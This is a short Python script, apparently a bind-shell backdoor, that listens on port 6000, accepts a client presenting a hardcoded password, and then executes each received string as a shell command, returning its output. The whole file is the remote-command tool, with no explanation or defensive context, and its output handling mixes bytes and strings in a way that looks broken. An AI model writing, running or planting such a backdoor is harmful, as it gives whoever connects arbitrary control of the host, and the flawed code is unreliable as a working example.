import socket
import subprocess

host = socket.gethostname()
port = 6000

password = "aXsl1ms9203mdujs"

server = socket.socket()
server.bind((host, port))

server.listen(1)
conn, address = server.accept()
guess = conn.recv(1024).decode()

if guess == password:
    while True:
        command = conn.recv(1024).decode()
        if not command:
            break
        print(command)

        shell = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = shell.stdout.read()
        error = shell.stderr.read()

        if output + error == '':
                conn.send('')
        else:
                conn.send(output + error)

conn.close()
